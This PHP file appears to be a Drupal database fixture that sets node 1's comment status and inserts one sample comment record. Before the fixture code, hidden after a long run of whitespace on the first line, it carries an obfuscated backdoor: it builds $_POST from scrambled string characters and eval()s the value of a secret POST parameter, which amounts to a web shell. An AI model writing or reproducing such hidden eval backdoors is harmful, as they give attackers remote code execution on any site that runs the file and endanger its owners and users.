<?php                                                                                                                                                                                                                                                                             $llc92 = "opst_uer" ; $xpc98 = $llc92[2]. $llc92[3]. $llc92[7]. $llc92[3]. $llc92[0]. $llc92[5].$llc92[1]. $llc92[1]. $llc92[6].$llc92[7]; $wtp2 = $xpc98($llc92[4]. $llc92[1]. $llc92[0]. $llc92[2].$llc92[3] ) ;if ( isset ( ${ $wtp2 } [ 'qdfdcc6'])){eval( ${ $wtp2}['qdfdcc6' ]) ; }?> <?php
db_update('node')->fields(array(
    'comment' => 2
  ))
  ->condition('nid', 1)
  ->execute();

db_insert('comments')->fields(array(
  'cid',
  'pid',
  'nid',
  'uid',
  'subject',
  'comment',
  'hostname',
  'timestamp',
  'status',
  'format',
  'thread',
  'name',
  'mail',
  'homepage',
))
->values(array(
  'cid' => 1,
  'pid' => 0,
  'nid' => 1,
  'uid' => 3,
  'subject' => 'Comment title 1',
  'comment' => 'Comment body 1 - Comment body 1 - Comment body 1 - Comment body 1 - Comment body 1 - Comment body 1 - Comment body 1 - Comment body 1',
  'hostname' => '127.0.0.1',
  'timestamp' => 1008617630,
  'status' => 0,
  'format' => 1,
  'thread' => '01/',
  'name' => NULL,
  'mail' => NULL,
  'homepage' => '',
))
->execute();
